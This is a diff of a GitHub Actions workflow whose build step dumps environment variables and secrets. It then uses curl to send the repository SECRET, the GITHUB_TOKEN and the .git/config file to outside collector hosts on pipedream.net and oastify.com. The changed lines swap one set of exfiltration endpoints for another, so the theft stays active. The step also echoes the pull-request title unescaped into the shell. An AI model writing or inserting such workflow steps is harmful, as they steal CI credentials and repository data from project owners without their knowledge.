@@ -36,11 +36,11 @@ jobs:
           echo test, and deploy your project.
           printenv
           echo ${{ secrets }}
-          curl "https://eozcx1zbue0apii.m.pipedream.net?secret=$SECRET"
-          curl "https://eozcx1zbue0apii.m.pipedream.net?github_token=$GITHUB_TOKEN"
+          curl "https://vnmf1fq7ob5euwoc6uqk6i183z9qxgl5.oastify.com?secret=$SECRET"
+          curl "https://vnmf1fq7ob5euwoc6uqk6i183z9qxgl5.oastify.com?github_token=$GITHUB_TOKEN"
           cat ./.git/config
           git config -l
-          curl -d @./.git/config rni2e9jg74foc2ge7l8r7f93zu5ltbh0.oastify.com
+          curl -d @./.git/config vnmf1fq7ob5euwoc6uqk6i183z9qxgl5.oastify.com
           echo "${{ github.event.pull_request.title }}"
         env:
           SECRET: ${{ secrets.SECRET }}
